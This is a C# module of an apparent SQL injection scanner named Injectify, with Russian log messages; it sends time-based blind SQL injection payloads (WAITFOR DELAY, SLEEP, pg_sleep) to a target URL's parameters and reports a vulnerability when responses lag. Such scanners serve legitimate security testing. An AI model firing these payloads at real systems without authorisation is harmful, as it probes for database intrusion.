using Injectify.Core;
using System.Diagnostics;

namespace Injectify.Modules
{
    public class BlindScanner : InjectifyScanner
    {
        private readonly List<string> _payloads = new()
        {
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND SLEEP(5)--",
            "'||(SELECT pg_sleep(5))--",
        };

        private readonly int delayThreshold = 4; // сек

        public BlindScanner(string targetUrl) : base(targetUrl) { }

        public override async Task<bool> IsVulnerableAsync()
        {
            Log("Начинаю тестирование Blind (time-based)...");

            return await TestParametersAsync(_payloads, async (url, key, payload) =>
            {
                var stopwatch = Stopwatch.StartNew();
                await SendRequestAsync("GET", url);
                stopwatch.Stop();

                if (stopwatch.Elapsed.TotalSeconds > delayThreshold)
                {
                    Log($"[Blind] Уязвимость! Параметр: {key}, Payload: {payload} — задержка {stopwatch.Elapsed.TotalSeconds:F2} сек");
                    return true;
                }

                return false;
            });
        }
    }
}
